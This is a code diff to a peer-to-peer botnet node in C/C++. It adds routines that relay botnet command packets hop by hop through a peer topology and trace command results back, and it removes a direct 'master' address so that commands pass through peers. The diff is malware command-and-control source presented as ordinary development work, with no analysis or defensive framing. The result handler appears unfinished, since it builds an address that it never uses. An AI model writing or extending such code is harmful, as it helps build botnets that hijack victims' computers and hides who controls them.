@@ -15,7 +15,6 @@
 
 static SOCKET udp_sock;
 static SOCKET tcp_sock;
-static struct sockaddr_in master;
 static BotnetNode botnet_topology;
 
 /* init */
@@ -126,6 +125,42 @@ void peer_request()
 /* end P2P */
 
 /* handling incomings */
+static void handle_command(u_char* const data, const struct sockaddr_in& src_addr)
+{
+	struct botnet_pack* const command = (struct botnet_pack*)data;
+	
+	if (command->dst_peer.ip + command->dst_peer.port + command->private_peer.ip + command->private_peer.port == 0)
+		send_command(data, BOTNET_PACK_SIZE);
+	else
+	{
+		command->numerics.id = botnet_topology.fowardCommand(command->numerics.id, src_addr);
+		struct sockaddr_in next_peer = botnet_topology.nextPathNode(command->dst_peer, command->private_peer);
+		
+		if (next_peer.sin_addr.s_addr == command->dst_peer.ip && next_peer.sin_port == command->dst_peer.port)
+		{
+			command->dst_peer = { 0, 0 };
+			command->private_peer = { 0, 0 };
+		}
+
+		sendto(udp_sock, (char*)data, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&next_peer, sizeof(next_peer));
+	}
+}
+
+static void handle_command_result(u_char* const data)
+{
+	/* locals */
+	struct sockaddr_in src_peer;
+	adr addr;
+
+	addr = botnet_topology.retrieveCommand(data);
+	if (addr.ip + addr.port == 0)
+		return;
+
+	src_peer.sin_family = AF_INET;
+	src_peer.sin_port = addr.port;
+	src_peer.sin_addr.s_addr = addr.ip;
+}
+
 static int handle_udp_connections()
 {
 	/* locals */
@@ -144,10 +179,10 @@ static int handle_udp_connections()
 	switch (p->type)
 	{
 	case PACK_TYPE::COMMAND:
-		master = client;
-		send_command(data, BOTNET_PACK_SIZE);
+		handle_command(data, client);
 		break;
 	case PACK_TYPE::COMMAND_RESULT:
+		handle_command_result(data);
 		break;
 	case PACK_TYPE::SYNC_REQUEST:
 		sync_reply(client);
